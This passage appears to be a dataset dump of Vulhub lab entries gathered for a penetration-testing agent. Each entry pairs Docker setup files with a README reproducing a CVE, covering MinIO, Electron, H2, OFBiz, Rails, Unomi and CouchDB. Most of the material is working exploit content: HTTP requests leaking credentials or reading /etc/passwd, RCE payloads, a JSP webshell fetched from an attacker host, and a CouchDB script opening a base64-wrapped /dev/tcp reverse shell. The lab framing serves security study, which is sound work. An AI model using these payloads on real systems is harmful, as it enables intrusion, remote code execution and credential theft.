volumes:\n      - ./mnt/data3:/mnt/data3\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/mnt/data1/.gitignore\n\n- Extension: \n- Language: unknown\n- Size: 11 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n.minio.sys\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/mnt/data2/.gitignore\n\n- Extension: \n- Language: unknown\n- Size: 11 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n.minio.sys\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/mnt/data3/.gitignore\n\n- Extension: \n- Language: unknown\n- Size: 11 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n.minio.sys\n\n```\n\n",
    "readme": "# MinIO Information Disclosure in Cluster Deployment (CVE-2023-28432)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nMinIO is a High Performance Object Storage released under GNU Affero General Public License v3.0.\n\nIn the version before `RELEASE.2023-03-20T20-16-18Z`, there is an information disclosure vulnerability if MinIO is deployed in cluster mode. An attacker can use an HTTP request to obtain all environment variables of the target process, including `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD`.\n\nReferences:\n\n- <https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q>\n- <https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ>\n\n## Vulnerable Environment\n\nExecuting following commands to start a MinIO cluster:\n\n```\ndocker compose up -d\n```\n\nAfter the cluster has been started, you can browse Web console on `http://your-ip:9001`, API server on `http://your-ip:9000`.\n\n## Vulnerability Reproduce\n\nThe issue exists in the API endpoint `http://your-ip:9000/minio/bootstrap/v1/verify`. Send the request to retrieve all environment variables:\n\n```\nPOST /minio/bootstrap/v1/verify HTTP/1.1\nHost: your-ip:9000\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\n\n```\n\n![](1.png)\n\nIt can be seen that `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` is exposed.\n\nSuccess to use this username and password to login the Web console:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2018-1000006.md",
    "filenamenomd": "CVE-2018-1000006",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/docker-entrypoint.sh\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/build/index.html\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/src/index.html\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/src/main.js\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/src/package.json\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 306 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n electron:\n   image: vulhub/electron:wine\n   command: bash /docker-entrypoint.sh\n   volumes:\n    - ./src:/project\n    - ./build:/build\n    - ./docker-entrypoint.sh:/docker-entrypoint.sh\n web:\n   image: nginx:1\n   volumes:\n    - ./build:/usr/share/nginx/html\n   ports:\n    - \"8080:80\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/docker-entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 271 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nset -ex \n\ncd /project && npm install && npm run build-${ARCH:=64}\n\nif [ -d \"/build/vulhub-app-win32-x64\" ] || [ -d \"/build/vulhub-app-win32-ia32\" ]; then\n    tar -zcvf /build/vulhub-app.tar.gz /build/vulhub-app-win32-*\n    rm -rf /build/vulhub-app-win32-*\nfi\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/build/index.html\n\n- Extension: .html\n- Language: html\n- Size: 320 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>CVE-2018-1000006 POC</title>\n  </head>\n  <body>\n    <h1>CVE-2018-1000006 POC</h1>\n    <p>download the <a href=\"./vulhub-app.tar.gz\">vulhub-app.tar.gz</a></p>\n    <p>and <a href='vulhub://example.com/\" \"--no-Sandbox\" \"--gpu-launcher=calc.exe'>click me</a></p>\n  </body>\n</html>\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/src/index.html\n\n- Extension: .html\n- Language: html\n- Size: 257 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Hello World!</title>\n  </head>\n  <body>\n    <h1>Hello World!</h1>\n    This is a demo for CVE-2018-1000006</br> \n    Electron version:<script>document.write(process.versions['electron'])</script>.\n  </body>\n</html>\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/src/main.js\n\n- Extension: .js\n- Language: javascript\n- Size: 1714 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```javascript\nconst {app, BrowserWindow} = require('electron')\nconst path = require('path')\nconst url = require('url')\nconst dialog = require('electron').dialog\n// Keep a global reference of the window object, if you don't, the window will\n// be closed automatically when the JavaScript object is garbage collected.\nlet win\n\nfunction createWindow () {\n  // Create the browser window.\n  win = new BrowserWindow({width: 800, height: 600})\n\n  // and load the index.html of the app.\n  win.loadURL(url.format({\n    pathname: path.join(__dirname, 'index.html'),\n    protocol: 'file:',\n    slashes: true\n  }))\n\n\n  // Emitted when the window is closed.\n  win.on('closed', function(){\n    // Dereference the window object, usually you would store windows\n    // in an array if your app supports multi windows, this is the time\n    // when you should delete the corresponding element.\n    win = null\n  })\n}\n\n// This method will be called when Electron has finished\n// initialization and is ready to create browser windows.\n// Some APIs can only be used after this event occurs.\napp.on('ready', createWindow)\n\n// Quit when all windows are closed.\napp.on('window-all-closed', () => {\n  // On macOS it is common for applications and their menu bar\n  // to stay active until the user quits explicitly with Cmd + Q\n  if (process.platform !== 'darwin') {\n    app.quit()\n  }\n})\n\napp.on('activate', function(){\n  // On macOS it's common to re-create a window in the app when the\n  // dock icon is clicked and there are no other windows open.\n\n  if (win === null) {\n    createWindow()\n  }\n})\napp.setAsDefaultProtocolClient('vulhub')\n\napp.on('open-url', function (event, url) {\n  dialog.showErrorBox('Welcome Back', `You arrived from: ${url}`)\n})\n\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-1000006/src/package.json\n\n- Extension: .json\n- Language: json\n- Size: 421 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```json\n{\n  \"name\": \"vulhub-app\",\n  \"version\": \"0.0.1\",\n  \"main\": \"main.js\",\n  \"scripts\": {\n    \"build-32\": \"electron-packager . vulhub-app --platform=win32 --arch=ia32 --electronVersion=1.8.1 --appVersion=0.0.1 --out=/build\",\n    \"build-64\": \"electron-packager . vulhub-app --platform=win32 --arch=x64 --electronVersion=1.8.1 --appVersion=0.0.1 --out=/build\"\n  },\n  \"devDependencies\": {\n    \"electron-packager\": \"^12.0.2\"\n  }\n}\n\n```\n\n",
    "readme": "# Electron Remote Code Execution Vulnerability（CVE-2018-1000006）\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nElectron is an open source library developed by GitHub for building cross-platform desktop applications with HTML, CSS, and JavaScript. Electron accomplishes this by combining Chromium and Node.js into a single runtime and apps can be packaged for Mac, Windows, and Linux.\n\nOn Windows, if an application developed by Electron registers a Protocol Handler (allowing the user to call the application in the browser), a parameter injection vulnerability may occur and eventually cause remote code vulnerability on the user side.\n\nReference link:[Electron < v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】](https://xianzhi.aliyun.com/forum/topic/1990)\n\n## Setup\n\nExecute the following commands to compile an vulnerability application:\n\n```\ndocker compose run -e ARCH=64 --rm electron\n```\n\nBecause the software needs to run on the Windows platform, it is necessary to set the value of the ARCH to the number of bits of the platform: 32 or 64.\n\nAfter the compilation completed, execute the following command to run the web service:\n\n```\ndocker compose run --rm -p 8080:80 web\n```\n\nNow, access`http://your-ip:8080/`You can see the POC page.\n\n## Exploit\n\nFirst, on the POC page, click on the first link and download the compiled software `vulhub-app.tar.gz`. After the download is complete, extract it and run it once:\n\n![](1.png)\n\nThis time the Protocol Handler will be registered.\n\nThen, go back to the POC page and click on the second link. The target software and calculator will pop up:\n\n![](2.png)\n\n> If fails, it may be browser's reason. After testing, the new Chrome browser will call vulhub-app when it clicks on the POC, but it will not execute calc.exe.\n"
  },
  {
    "filename": "CVE-2022-23221.md",
    "filenamenomd": "CVE-2022-23221",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/h2database/CVE-2022-23221/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/h2database/CVE-2022-23221/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 117 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/spring-with-h2database:2.0.206\n    ports:\n      - \"8080:8080\"\n      - \"5005:5005\"\n\n```\n\n",
    "readme": "# H2 Database Web Console Pre-Auth JDBC Attack RCE (CVE-2022-23221)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nH2 database is a fast, open-source Java-based relational database management system (RDBMS) that can be used in both embedded (within a Java application) and client-server modes.\n\nSpringboot with h2 database comes with a web management page if you set the following options:\n\n```\nspring.h2.console.enabled=true\nspring.h2.console.settings.web-allow-others=true\n```\n\nIn version 1.4.198, the H2 Web console restricted the creation of file databases or connecting to in-memory databases, thus fixing the [CVE-2018-10054](../CVE-2018-10054) vulnerability. However, attackers could bypass this restriction using JDBC attacks and some tricks in versions 1.4.198 up to (but not including) 2.1.210, and still execute arbitrary code.\n\nReferences:\n\n- <https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf>\n- <https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html>\n- <https://github.com/h2database/h2database/releases/tag/version-2.1.210>\n- <https://github.com/h2database/h2database/pull/1580>\n- <https://github.com/h2database/h2database/pull/1726>\n\n## Environment Setup\n\nStart a spring-boot with h2 database 2.0.206:\n\n```\ndocker compose up -d\n```\n\nAfter started the container, the spring-boot is listening on `http://your-ip:8080`, the management page is `http://your-ip:8080/h2-console/` by default.\n\n## Vulnerability Reproduce\n\nBefore reproducing this issue, we can confirm that the payload in [CVE-2018-10054](../CVE-2018-10054) is not exploitable because in-memory database is disabled after 1.4.197:\n\n![](1.png)\n\nStarting with version 1.4.197, the H2 console appends `;FORBID_CREATION=TRUE` to the JDBC URL by default, preventing the creation of file databases or connections to in-memory databases. However, attackers can bypass this restriction by adding a `\\` at the end of the JDBC URL, which disrupts the URL syntax and causes FORBID_CREATION to be ignored.\n\nCombining this trick with JDBC attacks, we can construct following malicious JDBC URL:\n\n```\njdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n    var is = java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()\n    var scanner = new java.util.Scanner(is).useDelimiter(\"\\\\A\")\n    throw new java.lang.Exception(scanner.next())\n$$;AUTHZPWD=\\\n```\n\nWhen logging into the Web console, you can run arbitrary commands using the provided URL (pay attention to the line breaks):\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2024-45195.md",
    "filenamenomd": "CVE-2024-45195",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2024-45195/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2024-45195/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/ofbiz:18.12.15\n   ports:\n    - \"8443:8443\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-45195)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.\n\nThis vulnerability occurs as a result of incomplete fixing for previous vulnerabilities (CVE-2024-32113, CVE-2024-36104, and CVE-2024-38856). In Apache OFBiz versions prior to 18.12.16, the developers implemented fixes for these previous issues, but the underlying problem of controller-view map state desynchronization still existed. This allowed attackers to bypass authentication and access sensitive admin-only view maps.\n\nReferences:\n\n- <https://github.com/apache/ofbiz-framework/commit/ab78769c2d>\n- <https://github.com/apache/ofbiz-plugins/commit/8b95fe6fa>\n- <https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/>\n\n## Vulnerable environment\n\nExecuting following command to start an Apache OfBiz 18.12.15 server:\n\n```\ndocker compose up -d\n```\n\nAfter a short wait, you can see the login page at `https://localhost:8443/accounting`.\n\n## Vulnerability Reproduce\n\nBefore reproducing the vulnerability, this exploit requires setting up a malicious XML schema file and a CSV file on an attacker-controlled server\n\nFirst one `rceschema.xml`, this XML schema defines the structure of the malicious JSP:\n\n```xml\n<data-files xsi:noNamespaceSchemaLocation=\"http://ofbiz.apache.org/dtds/datafiles.xsd\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n    <data-file name=\"rce\" separator-style=\"fixed-length\" type-code=\"text\" start-line=\"0\" encoding-type=\"UTF-8\">\n        <record name=\"rceentry\" limit=\"many\">\n            <field name=\"jsp\" type=\"String\" length=\"605\" position=\"0\"></field>\n        </record>\n    </data-file>\n</data-files>\n```\n\nSecond one `rcereport.csv`, this CSV file contains the actual JSP code:\n\n```jsp\n<%@ page import='java.io.*' %><%@ page import='java.util.*' %><h1>Ahoy!</h1><br><% String getcmd = request.getParameter(\"cmd\"); if (getcmd != null) { out.println(\"Command: \" + getcmd + \"<br>\"); String cmd1 = \"/bin/sh\"; String cmd2 = \"-c\"; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine();}} %>,\n```\n\nThen send the following request:\n\n```\nPOST /webtools/control/forgotPassword/viewdatafile HTTP/1.1\nHost: target:8443\nUser-Agent: curl/7.81.0\nAccept: */*\nContent-Length: 241\nContent-Type: application/x-www-form-urlencoded\n\nDATAFILE_LOCATION=http://attacker/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce\n```\n\n![](1.png)\n\nThis request exploits the vulnerability by leveraging the viewdatafile view map to write a malicious JSP file to the web root, effectively achieving remote code execution.\n\nAfter the JSP webshell is written, execute arbitrary commands through `https://localhost:8443/accounting/index.jsp?cmd=id`:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2019-5418.md",
    "filenamenomd": "CVE-2019-5418",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/rails/CVE-2019-5418/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/rails/CVE-2019-5418/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/rails/CVE-2019-5418/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 68 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   build: .\n   ports:\n    - \"3000:3000\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/rails/CVE-2019-5418/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 560 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/rails:5.2.2\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex \\\n    && rails generate controller vulhub \\\n    && { \\\n        echo 'class VulhubController < ApplicationController'; \\\n        echo '  def index'; \\\n        echo '    render file: \"#{Rails.root}/public/robots.txt\"'; \\\n        echo '  end'; \\\n        echo 'end'; \\\n    } > app/controllers/vulhub_controller.rb \\\n    && { \\\n        echo 'Rails.application.routes.draw do'; \\\n        echo \"  get 'robots', to: 'vulhub#index'\"; \\\n        echo 'end'; \\\n    } > config/routes.rb\n```\n\n",
    "readme": "# Ruby on Rails Path Traversal and Arbitrary File Read (CVE-2019-5418)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRuby on Rails is a web application framework that allows developers to build web applications quickly and easily.\n\nThere is a local file inclusion vulnerability in Ruby on Rails action view <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3.\n\nWhen using `render file` in a controller to render views outside the application, Rails determines the file location based on the user-supplied Accept header. By sending an Accept header with the value `Accept: ../../../../../../../../etc/passwd{{`, attackers can exploit a path traversal vulnerability to read arbitrary files.\n\nReferences:\n\n- https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q\n- https://github.com/mpgn/CVE-2019-5418\n- https://xz.aliyun.com/t/4448\n\n## Environment Setup\n\nExecute the following command to compile and start Ruby on Rails 5.2.2:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:3000` to see the Ruby on Rails welcome page.\n\n## Vulnerability Reproduction\n\nVisit `http://your-ip:3000/robots` to see that the normal robots.txt file is being read.\n\nTo exploit the vulnerability, send the following request to read `/etc/passwd`:\n\n```\nGET /robots HTTP/1.1\nHost: your-ip:3000\nAccept-Encoding: gzip, deflate\nAccept: ../../../../../../../../etc/passwd{{\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\n\n\n```\n\nSuccessfully read the file:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2020-13942.md",
    "filenamenomd": "CVE-2020-13942",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/unomi/CVE-2020-13942/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/unomi/CVE-2020-13942/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 417 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/unomi:1.5.1\n   ports:\n    - \"9443:9443\"\n    - \"8181:8181\"\n   environment:\n    - UNOMI_ELASTICSEARCH_ADDRESSES=elasticsearch:9200\n   depends_on:\n    - elasticsearch\n elasticsearch:\n   image: elasticsearch:7.9.3\n   environment:\n    - cluster.name=contextElasticSearch\n    - discovery.type=single-node\n    - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\"\n    - bootstrap.memory_lock=true\n\n```\n\n",
    "readme": "# Apache Unomi Expression Language Injection RCE (CVE-2020-13942)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Unomi is a Java Open Source customer data platform, a Java server designed to manage customers, leads and visitors’ data and help personalize customers experiences.\n\nIn the versions prior to 1.5.1, Apache Unomi allowed remote attackers to send malicious requests with MVEL and OGNL expressions that could contain arbitrary classes, resulting in Remote Code Execution (RCE) with the privileges of the Unomi application.\n\n## Environment Setup\n\nExecute following commands to start an Apache Unomi server 1.5.1:\n\n```\ndocker compose up -d\n```\n\nAfter the environment is started, you can access Unomi's API through `http://your-ip:8181` or `https://your-ip:9443`.\n\n## Vulnerability Reproduce\n\nThe vulnerability can be triggered through both ports 8181 and 9443.\n\nExecute arbitrary commands through MVEL expressions:\n\n```\nPOST /context.json HTTP/1.1\nHost: localhost:8181\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: application/json\nContent-Length: 483\n\n{\n    \"filters\": [\n        {\n            \"id\": \"sample\",\n            \"filters\": [\n                {\n                    \"condition\": {\n                         \"parameterValues\": {\n                            \"\": \"script::Runtime r = Runtime.getRuntime(); r.exec(\\\"touch /tmp/mvel\\\");\"\n                        },\n                        \"type\": \"profilePropertyCondition\"\n                    }\n                }\n            ]\n        }\n    ],\n    \"sessionId\": \"sample\"\n}\n```\n\nExecute arbitrary commands through OGNL expressions:\n\n```\nPOST /context.json HTTP/1.1\nHost: localhost:8181\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: application/json\nContent-Length: 1064\n\n{\n  \"personalizations\":[\n    {\n      \"id\":\"gender-test\",\n      \"strategy\":\"matching-first\",\n      \"strategyOptions\":{\n        \"fallback\":\"var2\"\n      },\n      \"contents\":[\n        {\n          \"filters\":[\n            {\n              \"condition\":{\n                \"parameterValues\":{\n                  \"propertyName\":\"(#runtimeclass = #this.getClass().forName(\\\"java.lang.Runtime\\\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\\\"getRuntime\\\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\\\"exec\\\")}.{? #this.getParameters()[0].getType().getName().equals(\\\"java.lang.String\\\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\\\"touch /tmp/ognl\\\"))\",\n                  \"comparisonOperator\":\"equals\",\n                  \"propertyValue\":\"male\"\n                },\n                \"type\":\"profilePropertyCondition\"\n              }\n            }\n          ]\n        }\n      ]\n    }\n  ],\n  \"sessionId\":\"sample\"\n}\n```\n\nEnter the Docker container, you can see that the command has been executed successfully:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-12636.md",
    "filenamenomd": "CVE-2017-12636",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12636/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12636/exp.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12636/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 97 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  couchdb:\n    image: vulhub/couchdb:1.6.0\n    ports:\n      - \"5984:5984\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2017-12636/exp.py\n\n- Extension: .py\n- Language: python\n- Size: 1295 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python3\nimport requests\nimport json\nimport base64\nfrom requests.auth import HTTPBasicAuth\n\ntarget = 'http://your-ip:5984'\ncommand = rb\"\"\"sh -i >& /dev/tcp/10.0.0.1/443 0>&1\"\"\"\nversion = 1\n\nsession = requests.session()\nsession.headers = {\n    'Content-Type': 'application/json'\n}\n# session.proxies = {\n#     'http': 'http://127.0.0.1:8085'\n# }\nsession.put(target + '/_users/org.couchdb.user:wooyun', data='''{\n  \"type\": \"user\",\n  \"name\": \"wooyun\",\n  \"roles\": [\"_admin\"],\n  \"roles\": [],\n  \"password\": \"wooyun\"\n}''')\n\nsession.auth = HTTPBasicAuth('wooyun', 'wooyun')\n\ncommand = \"bash -c '{echo,%s}|{base64,-d}|{bash,-i}'\" % base64.b64encode(command).decode()\nif version == 1:\n    session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))\nelse:\n    host = session.get(target + '/_membership').json()['all_nodes'][0]\n    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))\n\nsession.put(target + '/wooyun')\nsession.put(target + '/wooyun/test', data='{\"_id\": \"wooyuntest\"}')\n\nif version == 1:\n    session.post(target + '/wooyun/_temp_view?limit=10', data='{\"language\":\"cmd\",\"map\":\"\"}')\nelse:\n    session.put(target + '/wooyun/_design/test', data='{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}')\n```\n\n",
    "readme": "# Couchdb Arbitrary Command Execution (CVE-2017-12636)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.\n\nCouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB. This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user, including downloading and executing scripts from the public internet.\n\nChain [CVE-2017-12635](../CVE-2017-12635) and CVE-2017-12636 to get a unauthenticated remote command execution.\n\nReference link.\n\n - https://justi.cz/security/2017/11/14/couchdb-rce-npm.html\n - https://www.exploit-db.com/exploits/44498\n - http://bobao.360.cn/learning/detail/4716.html\n\n## Vulnerable Environment\n\nAPI interfaces of Couchdb 2.x and and 1.x are somewhat different, so this vulnerability is exploited in a different way. This environment is about version 1.6.0, if you want to test version 2.1.0, you can use the [CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635).\n\nStart a Couchdb 1.6.0 server.\n\n```\ndocker compose up -d\n```\n\nAfter the startup is complete, browse ``http://your-ip:5984/`` to see the welcome page of Couchdb.\n\n## Exploit explanation\n\nCVE-2017-12636 is a post-authentication RCE, so if you do not know the target administrator password, you can use [CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635) to add an administrator user first.\n\n### Exploit under 1.x\n\nExecute the following requests in sequence to trigger arbitrary command execution.\n\n```\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '\"id >/tmp/success\"'\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\": \"770895a97726d5ca6d70a22173005c7b\"}'\ncurl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{\"language\": \"cmd\", \"map\":\"\"}' -H 'Content-Type: application/json'\n```\n\nHere, `vulhub:vulhub` is the administrator account and password.\n\nThe first request is to add a **query_servers** with the name `cmd` and the value `\"id >/tmp/success\"`, which is the command we are going to execute later.\n\nThe second and third requests are to add a database and document, which can be queried only after it is added here.\n\nThe fourth request is to do a query in this Database, a **query_servers** named `cmd` that I added in the first step is used, and finally trigger the command execution.\n\n### Exploit under 2.x\n\nThe two APIs I used above have been modified in 2.1.0 and need to be explained in detail here.\n\nCouchdb 2.x introduces clustering, browser the `/_membership` to get the node list.\n\n```\ncurl http://vulhub:vulhub@your-ip:5984/_membership\n```\n\n![](1.png)\n\nAs you can see, we have only one node here, with the name `nonode@nohost`.\n\nThen, modify the configuration of node `nonode@nohost` as follows.\n\n```\ncurl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id >/tmp/success\"'\n```\n\n![](2.png)\n\nThen, in the same way as the 1.6.0 exploit:\n\n```\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\": \"770895a97726d5ca6d70a22173005c7b\"}'\n```\n\nCouchdb 2.x removed `_temp_view`, so we need to add a `_view` in order to trigger the command defined in `query_servers`:\n\n```\ncurl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\", \"views\":{\"woyun\":{\"map\":\"\"} },\" language\": \"cmd\"}' -H \"Content-Type: application/json\"\n```\n\nThen commands in `query_servers` will be executed.\n\n## POC script\n\nI wrote a simple POC [exp.py](exp.py), modified the target and command 